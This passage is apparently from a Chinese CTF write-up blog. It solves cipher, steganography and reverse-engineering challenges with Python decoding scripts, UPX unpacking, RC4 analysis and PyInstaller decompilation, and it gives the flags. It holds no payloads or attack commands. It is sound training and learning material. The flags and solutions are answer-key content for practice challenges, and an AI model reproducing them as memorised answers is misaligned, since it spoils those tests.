☵☲☴☳☳☴☵☲☱☷☲☱☳☳☴☵☲☲☶☲☰☴☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☷☲☱☰☲☶☱☳☴☵☲☳☳☲☷☵☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☶☲☶☰☲☲☱☳☴☴☲☷☰☲☷☳☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☲☲☲☱☴☳☵☰☲☶☰☲☲☰☳☴☵☲☰☵☲☵☴☳☴☶☲☵☵☲☴☳☳☴☵☲☷☱☲☶☳☳☴☷☲☵☵☲☱☱<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>八卦解码</p><pre class="line-numbers language-none"><code class="language-none">公正文明公正和谐公正平等文明友善法治和谐法治公正文明公正平等公正平等和谐爱国公正平等和谐和谐公正自由和谐爱国和谐富强和谐爱国公正公正公正和谐公正法治公正平等公正自由文明诚信和谐和谐文明公正平等公正公正和谐敬业和谐自由公正公正法治友善法治公正敬业法治友善平等公正民主和谐法治文明诚信和谐和谐民主和谐爱国文明诚信和谐和谐民主和谐文明公正友善爱国和谐爱国和谐民主公正和谐公正平等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>社会主义核心价值观解码</p><pre class="line-numbers language-none"><code class="language-none">bce-7bee8e3d808fcged-2ef94f&#125;i&#123;a7-18-12n81ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显然是栅栏，直接一把梭</p><p>W型栅栏分为5栏时</p><p>解密结果为：begin{eec8da87-ee32-11ed-8f8c-907841e2ffbc}</p><h2 id="下一站上岸"><a class="markdownIt-Anchor" href="#下一站上岸"></a> <strong>下一站上岸</strong></h2><p>使用010 Editor打开图片看到最后有一段BASE64，解码得到：“提示：摩斯密码”根据提示找图片中图形规律，查看图像中的交点发现，两个交点代表 - 一个交点代表 .  没有交点代表空格</p><p>得到摩斯密码： --. — …–.- .- … … — .-. .</p><p>解密后加上begin{}得到flag：begin{go_ashore}</p><h2 id="tupper"><a class="markdownIt-Anchor" href="#tupper"></a> <strong>Tupper</strong></h2><p>解压完看到里面txt文件内容像是某种编码，先写脚本提取发现是base64，然后cyberchef解码，结合题目名找网站生成图片，写脚本的也可以，网站<a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> <strong>Reverse</strong></h1><h2 id="real-checkin-xor"><a class="markdownIt-Anchor" href="#real-checkin-xor"></a> <strong>real checkin xor</strong></h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">verify_func</span><span class="token punctuation">(</span>ciper<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    encrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciper<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encrypted<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ciper<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> encryptedsecret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token string">"ez_python_xor_reverse"</span>flag <span class="token operator">=</span> verify_func<span class="token punctuation">(</span>secret<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#begin&#123;3z_PY7hoN_r3V3rSE_For_TH3_Be9inNEr!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红白机"><a class="markdownIt-Anchor" href="#红白机"></a> <strong>红白机</strong></h2><p>问了下GPT，是6502汇编，google一下发现有个6502在线编译器，直接一把梭了</p><p><img src="https://s2.loli.net/2024/02/20/9TyMegwduUK5Yro.png" alt="" / loading="lazy"></p><p>看了官方Wp，本意是让你翻译指令集，然后手搓一个简单的编译器，我是真不会，学习一下dl的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">0x400</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span> A <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>X <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>Y <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>    line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"LDX"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mat <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"LDX \#\$(.*)"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        X <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mat<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"LDA"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mat <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"LDA \#\$(.*)"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        A <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mat<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"STA"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mat <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"STA \$(.*),X"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>        off <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mat<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        off <span class="token operator">-=</span> <span class="token number">0x200</span>        arr<span class="token punctuation">[</span>off<span class="token operator">+</span>X<span class="token punctuation">]</span> <span class="token operator">=</span> A    <span class="token keyword">elif</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"INX"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> <span class="token number">1</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> arr<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="xor"><a class="markdownIt-Anchor" href="#xor"></a> <strong>Xor</strong></h2><p>首先查壳 发现存在upx壳 用upx-d脱壳得到原来程序</p><p>直接shift+f12查找到flag字符串然后交叉引用jump到关键函数，发现</p><p><img src="https://s2.loli.net/2024/02/20/PrbTMW6fg4mQVAK.png" alt="" / loading="lazy"></p><p>这个是函数的主逻辑，可以把sleep给nop掉，防止动态浪费时间</p><p>可以发现先get了一个字符串，然后进入了一个加密函数，里面有4个函数，慢慢分析</p><pre class="line-numbers language-none"><code class="language-none">加密函数内部分成了两个函数，这两个函数内部各有四个函数，这八个函数共同组成了flag的加密算法依次分析这八个函数，我们可以发现，这是一个仿轮式加密的算法算法先将前32个字符拆分成相同长度的两段，我们称之为输入1和输入2，再将长度为32的密钥同样拆分为两段，密钥1和密钥2第一轮中会将：输入1和密钥2异或输入2和密钥1异或输入1和密钥1异或输入2和密钥2异或输入1和逆序密钥2异或输入2和逆序密钥1异或输入1和逆序密钥1异或输入2和逆序密钥2异或第二轮加密同理，只是将之前的密钥换成了其他密钥在两轮加密结束后，将输入2和输入1合并，变成密文通过判断密文是否为&#96;agh&#123;^bvuwTooahlYocPtmyiijj|ek&#39;p来输出结果的正确与否第一轮的key63290794207715587679621386735000第二轮的key41803873625901363092606632787947<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>都是异或，根据异或的可逆性，我们直接把密文输入进去然后就可以得到flag了，直接动调</p><p><img src="https://s2.loli.net/2024/02/20/WGUdEMYFCxok4sL.png" alt="" / loading="lazy"></p><p>也可以写脚本直接逆，无非是麻烦点</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data6 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"606167687b5e62767577546f6f61686c"</span><span class="token punctuation">)</span>data5 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"596f6350746d7969696a6a7c656b2770"</span><span class="token punctuation">)</span>a4 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3431383033383733363235393031333600"</span><span class="token punctuation">)</span>a5 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3330393236303636333237383739343700"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span>data1 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3633323930373934323037373135353800"</span><span class="token punctuation">)</span>data2 <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"3736373936323133383637333530303000"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> a4<span class="token punctuation">[</span>i<span class="token punctuation">]</span>data4 <span class="token operator">=</span> data5data3 <span class="token operator">=</span> data6<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span> data4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> data2<span class="token punctuation">[</span>i<span class="token punctuation">]</span>flag <span class="token operator">=</span> data3 <span class="token operator">+</span> data4<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后面的逆向题就都不会写了，以下逆向题全是复现</p><h2 id="俄语学习"><a class="markdownIt-Anchor" href="#俄语学习"></a> <strong>俄语学习</strong></h2><p>找到主函数，直接拉到最后的主要加密函数</p><p><img src="https://s2.loli.net/2024/02/21/R7DU3rHwP2BVSZA.png" alt="" / loading="lazy"></p><p>进入加密函数内部,有strlen还要%256大概率是RC4,重命名进行分析，的确，但是不一样的地方在于没有box初始化函数，box是已经给出来的，所以破解rc4关键要找到box的值，但是box是空的，猜测前面的函数可能决定了box的取值，懒得去前面的一坨翻所以直接动态调试提取密码吧</p><p><img src="https://s2.loli.net/2024/02/21/dmaIL4nNbo3CUYQ.png" alt="" / loading="lazy"></p><p>再进入判断函数</p><p><img src="https://s2.loli.net/2024/02/21/YPahrUiMwgzHm1T.png" alt="" / loading="lazy"></p><pre class="line-numbers language-none"><code class="language-none">程序的正向逻辑,梳理一遍就是这样的输入flag&#96;&#96;&#96;  for ( i &#x3D; 0; ; ++i )  &#123;    v0 &#x3D; j__strlen(flag);                       &#x2F;&#x2F; flag和str1哪个小用哪个    v3 &#x3D; v0 &gt;&#x3D; j__strlen(str1) ? j__strlen(str1) : j__strlen(flag);    if ( i &gt; v3 )      break;    flag2[i] &#x3D; flag[i] + str1[i] - 112;  &#125;&#96;&#96;&#96;flag 经过此逻辑后变为 flag2 ，对flag2进行rc4,box变换密文是+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;对密文进行rc4，box2  然后与flag2比较box&#x3D;358E0B78B4F6319CD92CC1FCE2D81D8D4F978126C0B89627D55BAA1885FA61E4A1BCF8A4563743582BC97764CC6B986575388009113DD0E68FA9579906105DC569BD2D687EE367D1FF5EF9F5418CDD214BA747866DC32A9A9F2048BB94B97A9202747D1B1E5FBA49D6E75304CB283FE8333E009B6AFDBE1C90EDDF4D256FB513703C9E160C054A73DEB18A513B5414E05ADC9162A395D33A17EE32F27CAFB388EC0EAE9D5C0D554EFB46224445BF52126607D236936E421A0FE960CAB26C83F00376A81F63EFA5CD797B0ADAABDBD47F01342359E129C6ACA240C8ADC489C2B671A0EB2F19F3B0FECEF78472F4CFC7D7B7F14C8230502E24870839E5EAA68B15box2&#x3D;35F1DA197AF6319CD92CC1FCE2D81D8D4F978126C0B89627D55BAA1885FA61E4A1BCF8A4563743582BC97764CC6B986575388009113DD0E68FA9579906105DC569BD2D687EE367D1FF5EF9F5418CDD214BA747866DC32A9A9F2048BB94B9B49202747D1B1E5FBA49D6E75304CB283FE8333E009B6AFDBE1C90EDDF4D256FB513703C9E160C054A73DEB18A513B5414E05ADC9162A395D33A17EE32F27CAFB388EC0EAE9D5C0D554EFB46224445BF52126607D236936E421A0FE960CAB26C83F00376A81F63EFA5CD797B0A0BABDBD47F01342359E129C6ACA240C8ADC489C2B671A0EB2F78F3B0FECEF78472F4CFC7D7B78E4C8230502E24870839E5EAA68B15两个box的值都是一样的，rc4如加，直接逆前面那段逻辑就行了，<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2024/02/21/opXiQTePbcV72rY.png" alt="" / loading="lazy"></p><p>这个就是给box的函数，懒得逆了，rnm写到这发现没提str1[]的值，又坐一遍牢</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e>&#123;'</span>Str1<span class="token operator">=</span><span class="token string">'5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n\x8e'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#flag&#123;Russian_is_so_easy&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezpython"><a class="markdownIt-Anchor" href="#ezpython"></a> <strong>EzPython</strong></h2><p>首先利用pyinstxtractor工具拆包得到ezpython.exe_extracted</p><p>在里面找到ezpython.pyc文件，使用uncompyle6 反编译出源码</p><p>这里有个坑，如果python版本不对，作者自己写的东西是提不出来的，用conda下个3.8提取作者写的东西</p><p>如果用其他版本的py提会导致ezpython.exe_extracted\PYZ-00.pyz_extracted是空的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>python37<span class="token punctuation">)</span> PS C<span class="token punctuation">:</span>\Users\Npc\<span class="token punctuation">.</span>conda\envs\python37\Scripts<span class="token operator">></span> <span class="token punctuation">.</span>\uncompyle6<span class="token punctuation">.</span>exe <span class="token punctuation">.</span>\ezpython<span class="token punctuation">.</span>pyc<span class="token comment"># uncompyle6 version 3.9.0</span><span class="token comment"># Python bytecode version base 3.8.0 (3413)</span><span class="token comment"># Decompiled from: Python 3.7.12 | packaged by conda-forge | (default, Oct 26 2021, 05:35:01) [MSC v.1916 64 bit (AMD64)]</span><span class="token comment"># Embedded file name: ezpython.py</span><span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4<span class="token keyword">from</span> secret <span class="token keyword">import</span> key<span class="token punctuation">,</span> enc<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">pad_pkcs7</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7填充"""</span>    padding_len <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span>    padding <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>padding_len<span class="token punctuation">]</span> <span class="token operator">*</span> padding_len<span class="token punctuation">)</span>    <span class="token keyword">return</span> data <span class="token operator">+</span> padding<span class="token keyword">def</span> <span class="token function">unpad_pkcs7</span><span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7去填充"""</span>    padding_len <span class="token operator">=</span> padded_data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> padded_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>padding_len<span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">SM4</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>gmsm4 <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">encryptSM4</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> encrypt_key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        gmsm4 <span class="token operator">=</span> self<span class="token punctuation">.</span>gmsm4        gmsm4<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>encrypt_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_ENCRYPT<span class="token punctuation">)</span>        padded_value <span class="token operator">=</span> pad_pkcs7<span class="token punctuation">(</span>value<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        encrypt_value <span class="token operator">=</span> gmsm4<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_value<span class="token punctuation">)</span>        <span class="token keyword">return</span> 